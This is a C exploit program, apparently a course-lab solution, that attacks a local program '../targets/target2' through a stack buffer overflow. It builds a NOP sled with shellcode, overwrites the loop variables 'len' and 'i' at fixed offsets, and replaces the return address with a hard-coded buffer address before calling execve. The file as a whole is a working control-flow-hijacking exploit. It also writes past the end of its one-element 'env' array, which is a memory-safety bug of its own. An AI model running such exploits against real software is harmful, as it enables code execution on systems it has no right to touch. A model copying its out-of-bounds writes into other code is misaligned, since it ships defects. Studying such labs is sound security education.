#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

# define BUFFLEN 285


int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buff[BUFFLEN];
	int i;
	for (i = 0; i < BUFFLEN; i++){
		buff[i] = 0x90;
	}

	for (i = 0; i < strlen(shellcode); i++){
		buff[i] = shellcode[i];
	}

	// address of buf 0x2021fd80
	// address of len 0x2021fe88
	// address of i   0x2021fe8c
	// address of rip 0x2021fe98

	//change value of len to 283 so the loop continues past 272
	int* loc_len = (int*)&buff[264];
	*loc_len = 0x0000011c; 

	//change value of i to 264 so the loop continues past 272
	int* loc_i = (int*)&buff[268];
	*loc_i = 0x01010117; 



	int* loc = (int*)&buff[BUFFLEN - 5];
	*loc = 0x2021fd80; 
	buff[BUFFLEN - 1] = '\0';
	//int* end = (int*)&buff[BUFFLEN - 1];
	//*end = '\0'; 
	// buff[BUFFLEN - 1] = '\0';

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = buff;
	args[2] = NULL;

	//env[0] = NULL;
	env[0] = &buff[267];
	env[1] = &buff[268];


	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
